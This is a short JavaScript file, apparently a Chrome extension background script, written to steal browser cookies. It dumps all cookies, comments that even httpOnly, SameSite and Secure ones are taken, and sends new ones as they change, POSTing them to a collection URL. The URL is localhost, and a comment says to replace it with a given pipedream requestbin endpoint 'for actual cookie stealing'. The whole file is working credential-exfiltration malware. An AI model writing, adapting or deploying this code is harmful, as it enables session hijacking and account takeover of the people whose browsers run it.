/*
 * replace URL with requestbin for actual cookie stealing
 * https://en974z7hs59e3gc.m.pipedream.net/
 */
const URL = "http://localhost:6900";

/*
 * incremental cookie dump
 */
chrome.cookies.onChanged.addListener((event) => {
  // if its removed, ignore
  if (event.removed) return;
  console.log(event.cookie);
  send([event.cookie]);
});

/*
 * no cookies are safe, even httpOnly, sameSite, Secure types
 * This is the initial cookie dump
 */
chrome.cookies.getAll({}, (r) => {
  console.log(r);
  send(r);
});

function send(data) {
  fetch(URL, {
    method: "POST",
    body: JSON.stringify({ data }),
    headers: { "content-type": "application/json" },
  }).catch((err) => {
    console.warn(err);
  });
}
